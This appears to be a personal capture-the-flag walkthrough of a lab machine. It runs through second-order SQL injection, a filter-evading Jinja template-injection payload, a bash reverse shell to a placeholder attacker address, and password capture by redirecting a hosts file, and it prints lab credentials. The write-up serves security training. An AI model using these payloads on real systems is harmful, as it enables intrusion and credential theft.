nmap --privileged -sCV -p- -O -oA scan -T4 <MACHINE-IP>

open ports 
22
8000/tcp open  http    Werkzeug httpd 2.0.3 (Python 3.8.10)
|_http-title:  Login 

CVE-2024-49766
CVE-2024-34069

directory fuzzing
[23:01:50] 302 -  218B  - /logout  ->  http://10.49.146.52:8000/login
[23:04:21] 200 -  966B  - /register

registering this username:
`' union select 1,group_concat(username,password),3,4 from users --`

alt:
' union select 1,(select group_concat(TABLE_NAME,\":\",COLUMN_NAME,\"\r\n\") from Information_Schema.COLUMNS where TABLE_SCHEMA = 'website'),3,4-- -

counting words:

There are 2 words smokeySm0K3s_Th3C@t,' union select 1,group_concat(username,password),3,4 from users -- hello1234.

creds: smokey:Sm0K3s_Th3C@t

ssh smokey@<MACHINE-IP>

ENUMERATING:

/opt/app/app.py

app = Flask(__name__)

app.secret_key = '$uper@W3s0m3K3y!'

app.config['MYSQL_HOST'] = 'localhost'
app.config['MYSQL_USER'] = 'smokey'
app.config['MYSQL_PASSWORD'] = '$tr0nG_P@sS_W0rD@!'
app.config['MYSQL_DB'] = 'second_project'

mysql = MySQL(app)

@app.route('/')
@app.route('/login', methods =['GET', 'POST'])
def login():
        msg = ''
        blacklist = ["config","self","_",'"']
        if request.method == 'POST' and 'username' in request.form and 'password' in request.form:
                username = request.form['username']
                password = request.form['password']
                cursor = mysql.connection.cursor(MySQLdb.cursors.DictCursor)
                cursor.execute('SELECT * FROM users WHERE username = % s AND password = % s', (username, password, ))
                account = cursor.fetchone()
                for check in blacklist:
                    if check in username:
                        msg = "WAF test"
                        return render_template_string(msg)
                if account:
                        session['loggedin'] = True
                        session['id'] = account['id']
                        session['username'] = account['username']
                        msg = '''<!-- Store this code in 'index.html' file inside the 'templates' folder-->
and runs on:
if __name__=="__main__":
    app.run("127.0.0.1",5000)

ssh -L <local-port>:127.0.0.1:5000 smokey@<machine-ip>

to access it on our machine.

try SSTI {{7*7}} as username and voila

username for ssti aiming reverse shell:

username: 
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('bash%20/dev/shm/shell.sh')|attr('read')()}}
password: password

{{request  
|attr('application')  
|attr('\x5f\x5fglobals\x5f\x5f')  
|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')  
|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')  
|attr('popen')('id')  
|attr('read')()  
}}

what worked for me:
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('bash /dev/shm/shell.sh')|attr('read')()}}

using a real space instead of %20 for url encoded space

as smokey create a file /dev/shm/shell.sh with contents:
bash -c 'bash -i >& /dev/tcp/ATTACKER-IP/PORT 0>&1'

chmod +x file

register that user

login and obtained shell as hzel

get user flag

read note.txt



cat /etc/apache2/sites-available/
cat: /etc/apache2/sites-available/: Is a directory
hazel@ip-10-49-168-171:~$ ls /etc/apache2/sites-available/
000-default.conf  default-ssl.conf  dev_site.conf
hazel@ip-10-49-168-171:~$ cat /etc/apache2/sites-available/dev_site.conf 
Listen 127.0.0.1:8080

<VirtualHost 127.0.0.1:8080>
	# The ServerName directive sets the request scheme, hostname and port that
	# the server uses to identify itself. This is used when creating
	# redirection URLs. In the context of virtual hosts, the ServerName
	# specifies what hostname must appear in the request's Host: header to
	# match this virtual host. For the default virtual host (this file) this
	# value is not decisive as it is used as a last resort host regardless.
	# However, you must set it for any further virtual host explicitly.
	ServerName dev_site.thm

	ServerAdmin webmaster@localhost
	DocumentRoot /var/www/dev_site/

	# Available loglevels: trace8, ..., trace1, debug, info, notice, warn,
	# error, crit, alert, emerg.
	# It is also possible to configure the loglevel for particular
	# modules, e.g.
	#LogLevel info ssl:warn

	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined

	# For most configuration files from conf-available/, which are
	# enabled or disabled at a global level, it is possible to
	# include a line for only one particular virtual host. For example the
	# following line enables the CGI configuration for this host only
	# after it has been globally disabled with "a2disconf".
	#Include conf-available/serve-cgi-bin.conf
</VirtualHost>

# vim: syntax=apache ts=4 sw=4 sts=4 sr noet


ss -tlnp 
localhost port 8080
ssh -L 1337:127.0.0.1:8080 smokey@<MACHINE-IP>

edit the /ect/hosts file to put to our IP address

python3 -m http.server 8080

copying the contents of /var/www/dev_site

copy index.html for the login page. 

smokey keeps on login in

edit the hosts file as Hazel and point or our ip address
pyhthon3 -m http.server 8080

capture using wireshark:

for me the interface is tun0 since I'm on VPN 

look for this POST request:

python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.49.184.170 - - [17/Sep/2026 16:41:56] "GET / HTTP/1.1" 200 -
10.49.184.170 - - [17/Sep/2026 16:41:58] code 501, message Unsupported method ('POST')

obtain:
Form item: "password" = "A1lw@ys_C0m1nG_1N_2nd!!"

su root
password: A1lw@ys_C0m1nG_1N_2nd!!

get root flag

COMPLETE